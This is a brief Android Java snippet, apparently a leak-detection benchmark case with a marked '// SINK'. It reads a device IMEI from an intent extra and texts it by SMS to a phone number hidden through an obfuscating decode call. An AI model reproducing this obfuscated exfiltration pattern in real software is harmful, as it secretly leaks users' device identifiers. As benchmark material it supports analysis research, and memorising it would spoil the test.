public class InFlowActivity extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		[...]
		Intent i = getIntent();
		String imei = i.getStringExtra(f.e("AyHSV==S"));
	    SmsManager smsManager = SmsManager.getDefault();
       	// SINK	      
        smsManager.sendTextMessage(f.e("xtsSy6d="), null, imei, null, null);	
	}

}